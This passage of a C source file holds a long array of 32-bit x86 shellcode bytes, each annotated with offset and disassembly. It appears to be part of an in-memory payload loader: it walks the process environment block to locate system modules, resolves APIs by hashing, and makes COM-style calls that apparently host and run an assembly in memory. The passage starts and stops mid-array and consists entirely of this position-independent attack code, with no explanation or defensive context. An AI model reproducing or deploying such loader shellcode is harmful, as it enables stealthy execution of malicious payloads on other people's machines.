  /* 0497 */ "\x8b\x4e\x0c"                     /* mov       ecx, dword ptr [esi + 0xc]          */
  /* 049A */ "\x85\xc9"                         /* test      ecx, ecx                            */
  /* 049C */ "\x74\x09"                         /* je        0x4a7                               */
  /* 049E */ "\x8b\x01"                         /* mov       eax, dword ptr [ecx]                */
  /* 04A0 */ "\x51"                             /* push      ecx                                 */
  /* 04A1 */ "\xff\x50\x08"                     /* call      dword ptr [eax + 8]                 */
  /* 04A4 */ "\x89\x5e\x0c"                     /* mov       dword ptr [esi + 0xc], ebx          */
  /* 04A7 */ "\x8b\x4e\x08"                     /* mov       ecx, dword ptr [esi + 8]            */
  /* 04AA */ "\x85\xc9"                         /* test      ecx, ecx                            */
  /* 04AC */ "\x74\x12"                         /* je        0x4c0                               */
  /* 04AE */ "\x8b\x01"                         /* mov       eax, dword ptr [ecx]                */
  /* 04B0 */ "\x51"                             /* push      ecx                                 */
  /* 04B1 */ "\xff\x50\x2c"                     /* call      dword ptr [eax + 0x2c]              */
  /* 04B4 */ "\x8b\x46\x08"                     /* mov       eax, dword ptr [esi + 8]            */
  /* 04B7 */ "\x50"                             /* push      eax                                 */
  /* 04B8 */ "\x8b\x08"                         /* mov       ecx, dword ptr [eax]                */
  /* 04BA */ "\xff\x51\x08"                     /* call      dword ptr [ecx + 8]                 */
  /* 04BD */ "\x89\x5e\x08"                     /* mov       dword ptr [esi + 8], ebx            */
  /* 04C0 */ "\x8b\x4e\x04"                     /* mov       ecx, dword ptr [esi + 4]            */
  /* 04C3 */ "\x85\xc9"                         /* test      ecx, ecx                            */
  /* 04C5 */ "\x74\x09"                         /* je        0x4d0                               */
  /* 04C7 */ "\x8b\x01"                         /* mov       eax, dword ptr [ecx]                */
  /* 04C9 */ "\x51"                             /* push      ecx                                 */
  /* 04CA */ "\xff\x50\x08"                     /* call      dword ptr [eax + 8]                 */
  /* 04CD */ "\x89\x5e\x04"                     /* mov       dword ptr [esi + 4], ebx            */
  /* 04D0 */ "\x8b\x0e"                         /* mov       ecx, dword ptr [esi]                */
  /* 04D2 */ "\x85\xc9"                         /* test      ecx, ecx                            */
  /* 04D4 */ "\x74\x08"                         /* je        0x4de                               */
  /* 04D6 */ "\x8b\x01"                         /* mov       eax, dword ptr [ecx]                */
  /* 04D8 */ "\x51"                             /* push      ecx                                 */
  /* 04D9 */ "\xff\x50\x08"                     /* call      dword ptr [eax + 8]                 */
  /* 04DC */ "\x89\x1e"                         /* mov       dword ptr [esi], ebx                */
  /* 04DE */ "\x5f"                             /* pop       edi                                 */
  /* 04DF */ "\x5e"                             /* pop       esi                                 */
  /* 04E0 */ "\x5b"                             /* pop       ebx                                 */
  /* 04E1 */ "\xc3"                             /* ret                                           */
  /* 04E2 */ "\x83\xec\x14"                     /* sub       esp, 0x14                           */
  /* 04E5 */ "\x53"                             /* push      ebx                                 */
  /* 04E6 */ "\x55"                             /* push      ebp                                 */
  /* 04E7 */ "\x8b\xd9"                         /* mov       ebx, ecx                            */
  /* 04E9 */ "\x56"                             /* push      esi                                 */
  /* 04EA */ "\x8b\xf2"                         /* mov       esi, edx                            */
  /* 04EC */ "\x57"                             /* push      edi                                 */
  /* 04ED */ "\x83\xbb\x18\x03\x00\x00\x00"     /* cmp       dword ptr [ebx + 0x318], 0          */
  /* 04F4 */ "\x8d\xab\x00\x04\x00\x00"         /* lea       ebp, dword ptr [ebx + 0x400]        */
  /* 04FA */ "\x89\x74\x24\x10"                 /* mov       dword ptr [esp + 0x10], esi         */
  /* 04FE */ "\x74\x03"                         /* je        0x503                               */
  /* 0500 */ "\x8b\x6d\x00"                     /* mov       ebp, dword ptr [ebp]                */
  /* 0503 */ "\x56"                             /* push      esi                                 */
  /* 0504 */ "\x8d\x83\xc8\x02\x00\x00"         /* lea       eax, dword ptr [ebx + 0x2c8]        */
  /* 050A */ "\x50"                             /* push      eax                                 */
  /* 050B */ "\x8d\x83\xb8\x02\x00\x00"         /* lea       eax, dword ptr [ebx + 0x2b8]        */
  /* 0511 */ "\x50"                             /* push      eax                                 */
  /* 0512 */ "\xff\x93\x44\x01\x00\x00"         /* call      dword ptr [ebx + 0x144]             */
  /* 0518 */ "\x8b\xf8"                         /* mov       edi, eax                            */
  /* 051A */ "\x85\xff"                         /* test      edi, edi                            */
  /* 051C */ "\x0f\x88\x61\x01\x00\x00"         /* js        0x683                               */
  /* 0522 */ "\x8b\x16"                         /* mov       edx, dword ptr [esi]                */
  /* 0524 */ "\x8d\x46\x04"                     /* lea       eax, dword ptr [esi + 4]            */
  /* 0527 */ "\x50"                             /* push      eax                                 */
  /* 0528 */ "\x8d\x83\xd8\x02\x00\x00"         /* lea       eax, dword ptr [ebx + 0x2d8]        */
  /* 052E */ "\x50"                             /* push      eax                                 */
  /* 052F */ "\x8b\x0a"                         /* mov       ecx, dword ptr [edx]                */
  /* 0531 */ "\x8d\x45\x04"                     /* lea       eax, dword ptr [ebp + 4]            */
  /* 0534 */ "\x50"                             /* push      eax                                 */
  /* 0535 */ "\x52"                             /* push      edx                                 */
  /* 0536 */ "\xff\x51\x0c"                     /* call      dword ptr [ecx + 0xc]               */
  /* 0539 */ "\x8b\xf8"                         /* mov       edi, eax                            */
  /* 053B */ "\x85\xff"                         /* test      edi, edi                            */
  /* 053D */ "\x0f\x88\x40\x01\x00\x00"         /* js        0x683                               */
  /* 0543 */ "\x8b\x46\x04"                     /* mov       eax, dword ptr [esi + 4]            */
  /* 0546 */ "\x8d\x54\x24\x14"                 /* lea       edx, dword ptr [esp + 0x14]         */
  /* 054A */ "\x52"                             /* push      edx                                 */
  /* 054B */ "\x50"                             /* push      eax                                 */
  /* 054C */ "\x8b\x08"                         /* mov       ecx, dword ptr [eax]                */
  /* 054E */ "\xff\x51\x28"                     /* call      dword ptr [ecx + 0x28]              */
  /* 0551 */ "\x8b\xf8"                         /* mov       edi, eax                            */
  /* 0553 */ "\x85\xff"                         /* test      edi, edi                            */
  /* 0555 */ "\x0f\x88\x28\x01\x00\x00"         /* js        0x683                               */
  /* 055B */ "\x83\x7c\x24\x14\x00"             /* cmp       dword ptr [esp + 0x14], 0           */
  /* 0560 */ "\x0f\x84\x1d\x01\x00\x00"         /* je        0x683                               */
  /* 0566 */ "\x8b\x56\x04"                     /* mov       edx, dword ptr [esi + 4]            */
  /* 0569 */ "\x8d\x83\xf8\x02\x00\x00"         /* lea       eax, dword ptr [ebx + 0x2f8]        */
  /* 056F */ "\x83\xc6\x08"                     /* add       esi, 8                              */
  /* 0572 */ "\x56"                             /* push      esi                                 */
  /* 0573 */ "\x50"                             /* push      eax                                 */
  /* 0574 */ "\x8b\x0a"                         /* mov       ecx, dword ptr [edx]                */
  /* 0576 */ "\x8d\x83\xe8\x02\x00\x00"         /* lea       eax, dword ptr [ebx + 0x2e8]        */
  /* 057C */ "\x50"                             /* push      eax                                 */
  /* 057D */ "\x52"                             /* push      edx                                 */
  /* 057E */ "\x89\x74\x24\x28"                 /* mov       dword ptr [esp + 0x28], esi         */
  /* 0582 */ "\xff\x51\x24"                     /* call      dword ptr [ecx + 0x24]              */
  /* 0585 */ "\x8b\xf8"                         /* mov       edi, eax                            */
  /* 0587 */ "\x85\xff"                         /* test      edi, edi                            */
  /* 0589 */ "\x0f\x88\xf4\x00\x00\x00"         /* js        0x683                               */
  /* 058F */ "\x8b\x06"                         /* mov       eax, dword ptr [esi]                */
  /* 0591 */ "\x50"                             /* push      eax                                 */
  /* 0592 */ "\x8b\x08"                         /* mov       ecx, dword ptr [eax]                */
  /* 0594 */ "\xff\x51\x28"                     /* call      dword ptr [ecx + 0x28]              */
  /* 0597 */ "\x8b\xf8"                         /* mov       edi, eax                            */
  /* 0599 */ "\x85\xff"                         /* test      edi, edi                            */
  /* 059B */ "\x0f\x88\xe2\x00\x00\x00"         /* js        0x683                               */
  /* 05A1 */ "\x8d\x45\x44"                     /* lea       eax, dword ptr [ebp + 0x44]         */
  /* 05A4 */ "\x50"                             /* push      eax                                 */
  /* 05A5 */ "\xff\x93\x58\x01\x00\x00"         /* call      dword ptr [ebx + 0x158]             */
  /* 05AB */ "\x8b\x54\x24\x18"                 /* mov       edx, dword ptr [esp + 0x18]         */
  /* 05AF */ "\x8b\xf0"                         /* mov       esi, eax                            */
  /* 05B1 */ "\x8b\x44\x24\x10"                 /* mov       eax, dword ptr [esp + 0x10]         */
  /* 05B5 */ "\x83\xc0\x0c"                     /* add       eax, 0xc                            */
  /* 05B8 */ "\x50"                             /* push      eax                                 */
  /* 05B9 */ "\x8b\x12"                         /* mov       edx, dword ptr [edx]                */
  /* 05BB */ "\x6a\x00"                         /* push      0                                   */
  /* 05BD */ "\x56"                             /* push      esi                                 */
  /* 05BE */ "\x52"                             /* push      edx                                 */
  /* 05BF */ "\x8b\x0a"                         /* mov       ecx, dword ptr [edx]                */
  /* 05C1 */ "\x89\x44\x24\x28"                 /* mov       dword ptr [esp + 0x28], eax         */
  /* 05C5 */ "\xff\x51\x30"                     /* call      dword ptr [ecx + 0x30]              */
  /* 05C8 */ "\x56"                             /* push      esi                                 */
  /* 05C9 */ "\x8b\xf8"                         /* mov       edi, eax                            */
  /* 05CB */ "\xff\x93\x5c\x01\x00\x00"         /* call      dword ptr [ebx + 0x15c]             */
  /* 05D1 */ "\x85\xff"                         /* test      edi, edi                            */
  /* 05D3 */ "\x0f\x88\xaa\x00\x00\x00"         /* js        0x683                               */
  /* 05D9 */ "\x8b\x54\x24\x18"                 /* mov       edx, dword ptr [esp + 0x18]         */
  /* 05DD */ "\x8b\x74\x24\x10"                 /* mov       esi, dword ptr [esp + 0x10]         */
  /* 05E1 */ "\x8b\x12"                         /* mov       edx, dword ptr [edx]                */
  /* 05E3 */ "\x8d\x46\x10"                     /* lea       eax, dword ptr [esi + 0x10]         */
  /* 05E6 */ "\x50"                             /* push      eax                                 */
  /* 05E7 */ "\x8d\x83\x08\x03\x00\x00"         /* lea       eax, dword ptr [ebx + 0x308]        */
  /* 05ED */ "\x8b\x0a"                         /* mov       ecx, dword ptr [edx]                */
  /* 05EF */ "\x50"                             /* push      eax                                 */
  /* 05F0 */ "\x52"                             /* push      edx                                 */
  /* 05F1 */ "\xff\x11"                         /* call      dword ptr [ecx]                     */
  /* 05F3 */ "\x8b\xf8"                         /* mov       edi, eax                            */
  /* 05F5 */ "\x85\xff"                         /* test      edi, edi                            */
  /* 05F7 */ "\x0f\x88\x86\x00\x00\x00"         /* js        0x683                               */
  /* 05FD */ "\x83\x64\x24\x20\x00"             /* and       dword ptr [esp + 0x20], 0           */
  /* 0602 */ "\x8b\x85\x30\x03\x00\x00"         /* mov       eax, dword ptr [ebp + 0x330]        */
  /* 0608 */ "\x89\x44\x24\x1c"                 /* mov       dword ptr [esp + 0x1c], eax         */
  /* 060C */ "\x8d\x44\x24\x1c"                 /* lea       eax, dword ptr [esp + 0x1c]         */
  /* 0610 */ "\x50"                             /* push      eax                                 */
  /* 0611 */ "\x6a\x01"                         /* push      1                                   */
  /* 0613 */ "\x6a\x11"                         /* push      0x11                                */
  /* 0615 */ "\xff\x93\x48\x01\x00\x00"         /* call      dword ptr [ebx + 0x148]             */
  /* 061B */ "\x89\x44\x24\x18"                 /* mov       dword ptr [esp + 0x18], eax         */
  /* 061F */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 0621 */ "\x74\x60"                         /* je        0x683                               */
  /* 0623 */ "\x8b\x50\x0c"                     /* mov       edx, dword ptr [eax + 0xc]          */
  /* 0626 */ "\x33\xc9"                         /* xor       ecx, ecx                            */
  /* 0628 */ "\x39\x8d\x30\x03\x00\x00"         /* cmp       dword ptr [ebp + 0x330], ecx        */
  /* 062E */ "\x76\x13"                         /* jbe       0x643                               */
  /* 0630 */ "\x8a\x84\x29\x34\x03\x00\x00"     /* mov       al, byte ptr [ecx + ebp + 0x334]    */
  /* 0637 */ "\x88\x04\x0a"                     /* mov       byte ptr [edx + ecx], al            */
  /* 063A */ "\x41"                             /* inc       ecx                                 */
  /* 063B */ "\x3b\x8d\x30\x03\x00\x00"         /* cmp       ecx, dword ptr [ebp + 0x330]        */
  /* 0641 */ "\x72\xed"                         /* jb        0x630                               */
  /* 0643 */ "\x8b\x4e\x10"                     /* mov       ecx, dword ptr [esi + 0x10]         */
  /* 0646 */ "\x8d\x46\x14"                     /* lea       eax, dword ptr [esi + 0x14]         */
  /* 0649 */ "\x8b\x74\x24\x18"                 /* mov       esi, dword ptr [esp + 0x18]         */
  /* 064D */ "\x50"                             /* push      eax                                 */
  /* 064E */ "\x56"                             /* push      esi                                 */
  /* 064F */ "\x8b\x11"                         /* mov       edx, dword ptr [ecx]                */
  /* 0651 */ "\x51"                             /* push      ecx                                 */
  /* 0652 */ "\xff\x92\xb4\x00\x00\x00"         /* call      dword ptr [edx + 0xb4]              */
  /* 0658 */ "\x8b\x4e\x0c"                     /* mov       ecx, dword ptr [esi + 0xc]          */
  /* 065B */ "\x33\xd2"                         /* xor       edx, edx                            */
  /* 065D */ "\x8b\xf8"                         /* mov       edi, eax                            */
  /* 065F */ "\x8b\xc2"                         /* mov       eax, edx                            */
  /* 0661 */ "\x39\x95\x30\x03\x00\x00"         /* cmp       dword ptr [ebp + 0x330], edx        */
  /* 0667 */ "\x76\x13"                         /* jbe       0x67c                               */
  /* 0669 */ "\x88\x94\x28\x34\x03\x00\x00"     /* mov       byte ptr [eax + ebp + 0x334], dl    */
  /* 0670 */ "\x88\x14\x01"                     /* mov       byte ptr [ecx + eax], dl            */
  /* 0673 */ "\x40"                             /* inc       eax                                 */
  /* 0674 */ "\x3b\x85\x30\x03\x00\x00"         /* cmp       eax, dword ptr [ebp + 0x330]        */
  /* 067A */ "\x72\xed"                         /* jb        0x669                               */
  /* 067C */ "\x56"                             /* push      esi                                 */
  /* 067D */ "\xff\x93\x54\x01\x00\x00"         /* call      dword ptr [ebx + 0x154]             */
  /* 0683 */ "\xf7\xd7"                         /* not       edi                                 */
  /* 0685 */ "\xc1\xef\x1f"                     /* shr       edi, 0x1f                           */
  /* 0688 */ "\x8b\xc7"                         /* mov       eax, edi                            */
  /* 068A */ "\x5f"                             /* pop       edi                                 */
  /* 068B */ "\x5e"                             /* pop       esi                                 */
  /* 068C */ "\x5d"                             /* pop       ebp                                 */
  /* 068D */ "\x5b"                             /* pop       ebx                                 */
  /* 068E */ "\x83\xc4\x14"                     /* add       esp, 0x14                           */
  /* 0691 */ "\xc3"                             /* ret                                           */
  /* 0692 */ "\x83\xec\x40"                     /* sub       esp, 0x40                           */
  /* 0695 */ "\x53"                             /* push      ebx                                 */
  /* 0696 */ "\x55"                             /* push      ebp                                 */
  /* 0697 */ "\x56"                             /* push      esi                                 */
  /* 0698 */ "\x57"                             /* push      edi                                 */
  /* 0699 */ "\x33\xc0"                         /* xor       eax, eax                            */
  /* 069B */ "\x89\x54\x24\x1c"                 /* mov       dword ptr [esp + 0x1c], edx         */
  /* 069F */ "\x8d\x7c\x24\x30"                 /* lea       edi, dword ptr [esp + 0x30]         */
  /* 06A3 */ "\x8b\xd9"                         /* mov       ebx, ecx                            */
  /* 06A5 */ "\xab"                             /* stosd     dword ptr es:[edi], eax             */
  /* 06A6 */ "\x83\xbb\x18\x03\x00\x00\x00"     /* cmp       dword ptr [ebx + 0x318], 0          */
  /* 06AD */ "\x8d\xb3\x00\x04\x00\x00"         /* lea       esi, dword ptr [ebx + 0x400]        */
  /* 06B3 */ "\xab"                             /* stosd     dword ptr es:[edi], eax             */
  /* 06B4 */ "\xab"                             /* stosd     dword ptr es:[edi], eax             */
  /* 06B5 */ "\xab"                             /* stosd     dword ptr es:[edi], eax             */
  /* 06B6 */ "\x74\x02"                         /* je        0x6ba                               */
  /* 06B8 */ "\x8b\x36"                         /* mov       esi, dword ptr [esi]                */
  /* 06BA */ "\x8d\x86\x84\x00\x00\x00"         /* lea       eax, dword ptr [esi + 0x84]         */
  /* 06C0 */ "\x50"                             /* push      eax                                 */
  /* 06C1 */ "\xff\x93\x58\x01\x00\x00"         /* call      dword ptr [ebx + 0x158]             */
  /* 06C7 */ "\x89\x44\x24\x18"                 /* mov       dword ptr [esp + 0x18], eax         */
  /* 06CB */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 06CD */ "\x0f\x84\x0c\x01\x00\x00"         /* je        0x7df                               */
  /* 06D3 */ "\x8d\x86\xc4\x00\x00\x00"         /* lea       eax, dword ptr [esi + 0xc4]         */
  /* 06D9 */ "\x50"                             /* push      eax                                 */
  /* 06DA */ "\xff\x93\x58\x01\x00\x00"         /* call      dword ptr [ebx + 0x158]             */
  /* 06E0 */ "\x8b\xe8"                         /* mov       ebp, eax                            */
  /* 06E2 */ "\x89\x6c\x24\x10"                 /* mov       dword ptr [esp + 0x10], ebp         */
  /* 06E6 */ "\x85\xed"                         /* test      ebp, ebp                            */
  /* 06E8 */ "\x0f\x84\xdd\x00\x00\x00"         /* je        0x7cb                               */
  /* 06EE */ "\x8b\x44\x24\x1c"                 /* mov       eax, dword ptr [esp + 0x1c]         */
  /* 06F2 */ "\x8b\x50\x14"                     /* mov       edx, dword ptr [eax + 0x14]         */
  /* 06F5 */ "\x83\xc0\x18"                     /* add       eax, 0x18                           */
  /* 06F8 */ "\x50"                             /* push      eax                                 */
  /* 06F9 */ "\xff\x74\x24\x1c"                 /* push      dword ptr [esp + 0x1c]              */
  /* 06FD */ "\x89\x44\x24\x24"                 /* mov       dword ptr [esp + 0x24], eax         */
  /* 0701 */ "\x8b\x0a"                         /* mov       ecx, dword ptr [edx]                */
  /* 0703 */ "\x52"                             /* push      edx                                 */
  /* 0704 */ "\xff\x51\x44"                     /* call      dword ptr [ecx + 0x44]              */
  /* 0707 */ "\x8b\xf8"                         /* mov       edi, eax                            */
  /* 0709 */ "\x85\xff"                         /* test      edi, edi                            */
  /* 070B */ "\x0f\x88\xba\x00\x00\x00"         /* js        0x7cb                               */
  /* 0711 */ "\x8b\x86\x04\x01\x00\x00"         /* mov       eax, dword ptr [esi + 0x104]        */
  /* 0717 */ "\x33\xed"                         /* xor       ebp, ebp                            */
  /* 0719 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 071B */ "\x74\x6e"                         /* je        0x78b                               */
  /* 071D */ "\x50"                             /* push      eax                                 */
  /* 071E */ "\x55"                             /* push      ebp                                 */
  /* 071F */ "\x6a\x0c"                         /* push      0xc                                 */
  /* 0721 */ "\xff\x93\x4c\x01\x00\x00"         /* call      dword ptr [ebx + 0x14c]             */
  /* 0727 */ "\x8b\xe8"                         /* mov       ebp, eax                            */
  /* 0729 */ "\x85\xed"                         /* test      ebp, ebp                            */
  /* 072B */ "\x74\x5e"                         /* je        0x78b                               */
  /* 072D */ "\x83\x64\x24\x14\x00"             /* and       dword ptr [esp + 0x14], 0           */
  /* 0732 */ "\x83\xbe\x04\x01\x00\x00\x00"     /* cmp       dword ptr [esi + 0x104], 0          */
  /* 0739 */ "\x76\x50"                         /* jbe       0x78b                               */
  /* 073B */ "\x33\xc0"                         /* xor       eax, eax                            */
  /* 073D */ "\xc1\xe0\x06"                     /* shl       eax, 6                              */
  /* 0740 */ "\x05\x08\x01\x00\x00"             /* add       eax, 0x108                          */
  /* 0745 */ "\x03\xc6"                         /* add       eax, esi                            */
  /* 0747 */ "\x50"                             /* push      eax                                 */
  /* 0748 */ "\xff\x93\x58\x01\x00\x00"         /* call      dword ptr [ebx + 0x158]             */
  /* 074E */ "\x6a\x08"                         /* push      8                                   */
  /* 0750 */ "\x89\x44\x24\x2c"                 /* mov       dword ptr [esp + 0x2c], eax         */
  /* 0754 */ "\x58"                             /* pop       eax                                 */
  /* 0755 */ "\x66\x89\x44\x24\x20"             /* mov       word ptr [esp + 0x20], ax           */
  /* 075A */ "\x8d\x44\x24\x20"                 /* lea       eax, dword ptr [esp + 0x20]         */
  /* 075E */ "\x50"                             /* push      eax                                 */
  /* 075F */ "\x8d\x44\x24\x18"                 /* lea       eax, dword ptr [esp + 0x18]         */
  /* 0763 */ "\x50"                             /* push      eax                                 */
  /* 0764 */ "\x55"                             /* push      ebp                                 */
  /* 0765 */ "\xff\x93\x50\x01\x00\x00"         /* call      dword ptr [ebx + 0x150]             */
  /* 076B */ "\x8b\xf8"                         /* mov       edi, eax                            */
  /* 076D */ "\x85\xff"                         /* test      edi, edi                            */
  /* 076F */ "\x79\x09"                         /* jns       0x77a                               */
  /* 0771 */ "\x55"                             /* push      ebp                                 */
  /* 0772 */ "\xff\x93\x54\x01\x00\x00"         /* call      dword ptr [ebx + 0x154]             */
  /* 0778 */ "\x33\xed"                         /* xor       ebp, ebp                            */
  /* 077A */ "\x8b\x44\x24\x14"                 /* mov       eax, dword ptr [esp + 0x14]         */
  /* 077E */ "\x40"                             /* inc       eax                                 */
  /* 077F */ "\x89\x44\x24\x14"                 /* mov       dword ptr [esp + 0x14], eax         */
  /* 0783 */ "\x3b\x86\x04\x01\x00\x00"         /* cmp       eax, dword ptr [esi + 0x104]        */
  /* 0789 */ "\x72\xb2"                         /* jb        0x73d                               */
  /* 078B */ "\x85\xff"                         /* test      edi, edi                            */
  /* 078D */ "\x78\x38"                         /* js        0x7c7                               */
  /* 078F */ "\x8b\x44\x24\x1c"                 /* mov       eax, dword ptr [esp + 0x1c]         */
  /* 0793 */ "\x8d\x54\x24\x40"                 /* lea       edx, dword ptr [esp + 0x40]         */
  /* 0797 */ "\x52"                             /* push      edx                                 */
  /* 0798 */ "\x55"                             /* push      ebp                                 */
  /* 0799 */ "\x83\xec\x10"                     /* sub       esp, 0x10                           */
  /* 079C */ "\x8d\x74\x24\x48"                 /* lea       esi, dword ptr [esp + 0x48]         */
  /* 07A0 */ "\x8b\x00"                         /* mov       eax, dword ptr [eax]                */
  /* 07A2 */ "\x8b\xfc"                         /* mov       edi, esp                            */
  /* 07A4 */ "\x6a\x00"                         /* push      0                                   */
  /* 07A6 */ "\x8b\x08"                         /* mov       ecx, dword ptr [eax]                */
  /* 07A8 */ "\xa5"                             /* movsd     dword ptr es:[edi], dword ptr [esi] */
  /* 07A9 */ "\x68\x18\x01\x00\x00"             /* push      0x118                               */
  /* 07AE */ "\xff\x74\x24\x30"                 /* push      dword ptr [esp + 0x30]              */
  /* 07B2 */ "\xa5"                             /* movsd     dword ptr es:[edi], dword ptr [esi] */
  /* 07B3 */ "\x50"                             /* push      eax                                 */
  /* 07B4 */ "\xa5"                             /* movsd     dword ptr es:[edi], dword ptr [esi] */
  /* 07B5 */ "\xa5"                             /* movsd     dword ptr es:[edi], dword ptr [esi] */
  /* 07B6 */ "\xff\x91\xe4\x00\x00\x00"         /* call      dword ptr [ecx + 0xe4]              */
  /* 07BC */ "\x85\xed"                         /* test      ebp, ebp                            */
  /* 07BE */ "\x74\x07"                         /* je        0x7c7                               */
  /* 07C0 */ "\x55"                             /* push      ebp                                 */
  /* 07C1 */ "\xff\x93\x54\x01\x00\x00"         /* call      dword ptr [ebx + 0x154]             */
  /* 07C7 */ "\x8b\x6c\x24\x10"                 /* mov       ebp, dword ptr [esp + 0x10]         */
  /* 07CB */ "\x55"                             /* push      ebp                                 */
  /* 07CC */ "\xff\x93\x5c\x01\x00\x00"         /* call      dword ptr [ebx + 0x15c]             */
  /* 07D2 */ "\xff\x74\x24\x18"                 /* push      dword ptr [esp + 0x18]              */
  /* 07D6 */ "\xff\x93\x5c\x01\x00\x00"         /* call      dword ptr [ebx + 0x15c]             */
  /* 07DC */ "\x33\xc0"                         /* xor       eax, eax                            */
  /* 07DE */ "\x40"                             /* inc       eax                                 */
  /* 07DF */ "\x5f"                             /* pop       edi                                 */
  /* 07E0 */ "\x5e"                             /* pop       esi                                 */
  /* 07E1 */ "\x5d"                             /* pop       ebp                                 */
  /* 07E2 */ "\x5b"                             /* pop       ebx                                 */
  /* 07E3 */ "\x83\xc4\x40"                     /* add       esp, 0x40                           */
  /* 07E6 */ "\xc3"                             /* ret                                           */
  /* 07E7 */ "\x64\xa1\x30\x00\x00\x00"         /* mov       eax, dword ptr fs:[0x30]            */
  /* 07ED */ "\x33\xd2"                         /* xor       edx, edx                            */
  /* 07EF */ "\x56"                             /* push      esi                                 */
  /* 07F0 */ "\x8b\x40\x0c"                     /* mov       eax, dword ptr [eax + 0xc]          */
  /* 07F3 */ "\x8b\x70\x0c"                     /* mov       esi, dword ptr [eax + 0xc]          */
  /* 07F6 */ "\xeb\x1f"                         /* jmp       0x817                               */
  /* 07F8 */ "\x85\xd2"                         /* test      edx, edx                            */
  /* 07FA */ "\x75\x22"                         /* jne       0x81e                               */
  /* 07FC */ "\xff\x74\x24\x14"                 /* push      dword ptr [esp + 0x14]              */
  /* 0800 */ "\x8b\xc8"                         /* mov       ecx, eax                            */
  /* 0802 */ "\xff\x74\x24\x14"                 /* push      dword ptr [esp + 0x14]              */
  /* 0806 */ "\xff\x74\x24\x14"                 /* push      dword ptr [esp + 0x14]              */
  /* 080A */ "\xff\x74\x24\x14"                 /* push      dword ptr [esp + 0x14]              */
  /* 080E */ "\xe8\x3b\xfb\xff\xff"             /* call      0x34e                               */
  /* 0813 */ "\x8b\x36"                         /* mov       esi, dword ptr [esi]                */
  /* 0815 */ "\x8b\xd0"                         /* mov       edx, eax                            */
  /* 0817 */ "\x8b\x46\x18"                     /* mov       eax, dword ptr [esi + 0x18]         */
  /* 081A */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 081C */ "\x75\xda"                         /* jne       0x7f8                               */
  /* 081E */ "\x8b\xc2"                         /* mov       eax, edx                            */
  /* 0820 */ "\x5e"                             /* pop       esi                                 */
  /* 0821 */ "\xc2\x10\x00"                     /* ret       0x10                                */
  /* 0824 */ "\x83\xec\x18"                     /* sub       esp, 0x18                           */
  /* 0827 */ "\x53"                             /* push      ebx                                 */
  /* 0828 */ "\x8b\x5c\x24\x20"                 /* mov       ebx, dword ptr [esp + 0x20]         */
  /* 082C */ "\x33\xc0"                         /* xor       eax, eax                            */
  /* 082E */ "\x55"                             /* push      ebp                                 */
  /* 082F */ "\x8b\x6c\x24\x28"                 /* mov       ebp, dword ptr [esp + 0x28]         */
  /* 0833 */ "\x56"                             /* push      esi                                 */
  /* 0834 */ "\x57"                             /* push      edi                                 */
  /* 0835 */ "\x33\xf6"                         /* xor       esi, esi                            */
  /* 0837 */ "\x89\x4c\x24\x14"                 /* mov       dword ptr [esp + 0x14], ecx         */
  /* 083B */ "\x33\xff"                         /* xor       edi, edi                            */
  /* 083D */ "\x89\x44\x24\x2c"                 /* mov       dword ptr [esp + 0x2c], eax         */
  /* 0841 */ "\x89\x7c\x24\x10"                 /* mov       dword ptr [esp + 0x10], edi         */
  /* 0845 */ "\x8a\x0c\x08"                     /* mov       cl, byte ptr [eax + ecx]            */
  /* 0848 */ "\x84\xc9"                         /* test      cl, cl                              */
  /* 084A */ "\x74\x11"                         /* je        0x85d                               */
  /* 084C */ "\x83\xf8\x40"                     /* cmp       eax, 0x40                           */
  /* 084F */ "\x74\x0c"                         /* je        0x85d                               */
  /* 0851 */ "\x88\x4c\x34\x18"                 /* mov       byte ptr [esp + esi + 0x18], cl     */
  /* 0855 */ "\x46"                             /* inc       esi                                 */
  /* 0856 */ "\x40"                             /* inc       eax                                 */
  /* 0857 */ "\x89\x44\x24\x2c"                 /* mov       dword ptr [esp + 0x2c], eax         */
  /* 085B */ "\xeb\x4a"                         /* jmp       0x8a7                               */
  /* 085D */ "\x8d\x54\x24\x18"                 /* lea       edx, dword ptr [esp + 0x18]         */
  /* 0861 */ "\x32\xc0"                         /* xor       al, al                              */
  /* 0863 */ "\x03\xd6"                         /* add       edx, esi                            */
  /* 0865 */ "\x6a\x10"                         /* push      0x10                                */
  /* 0867 */ "\x59"                             /* pop       ecx                                 */
  /* 0868 */ "\x2b\xce"                         /* sub       ecx, esi                            */
  /* 086A */ "\x8b\xfa"                         /* mov       edi, edx                            */
  /* 086C */ "\xf3\xaa"                         /* rep stosb byte ptr es:[edi], al               */
  /* 086E */ "\xc6\x02\x80"                     /* mov       byte ptr [edx], 0x80                */
  /* 0871 */ "\x83\xfe\x0c"                     /* cmp       esi, 0xc                            */
  /* 0874 */ "\x72\x1a"                         /* jb        0x890                               */
  /* 0876 */ "\x55"                             /* push      ebp                                 */
  /* 0877 */ "\x53"                             /* push      ebx                                 */
  /* 0878 */ "\x8d\x4c\x24\x20"                 /* lea       ecx, dword ptr [esp + 0x20]         */
  /* 087C */ "\xe8\x5a\x00\x00\x00"             /* call      0x8db                               */
  /* 0881 */ "\x6a\x10"                         /* push      0x10                                */
  /* 0883 */ "\x33\xd8"                         /* xor       ebx, eax                            */
  /* 0885 */ "\x8d\x7c\x24\x1c"                 /* lea       edi, dword ptr [esp + 0x1c]         */
  /* 0889 */ "\x33\xea"                         /* xor       ebp, edx                            */
  /* 088B */ "\x32\xc0"                         /* xor       al, al                              */
  /* 088D */ "\x59"                             /* pop       ecx                                 */
  /* 088E */ "\xf3\xaa"                         /* rep stosb byte ptr es:[edi], al               */
  /* 0890 */ "\x8b\x44\x24\x2c"                 /* mov       eax, dword ptr [esp + 0x2c]         */
  /* 0894 */ "\x8b\x7c\x24\x10"                 /* mov       edi, dword ptr [esp + 0x10]         */
  /* 0898 */ "\xc1\xe0\x03"                     /* shl       eax, 3                              */
  /* 089B */ "\x47"                             /* inc       edi                                 */
  /* 089C */ "\x6a\x10"                         /* push      0x10                                */
  /* 089E */ "\x89\x44\x24\x28"                 /* mov       dword ptr [esp + 0x28], eax         */
  /* 08A2 */ "\x5e"                             /* pop       esi                                 */
  /* 08A3 */ "\x89\x7c\x24\x10"                 /* mov       dword ptr [esp + 0x10], edi         */
  /* 08A7 */ "\x83\xfe\x10"                     /* cmp       esi, 0x10                           */
  /* 08AA */ "\x75\x11"                         /* jne       0x8bd                               */
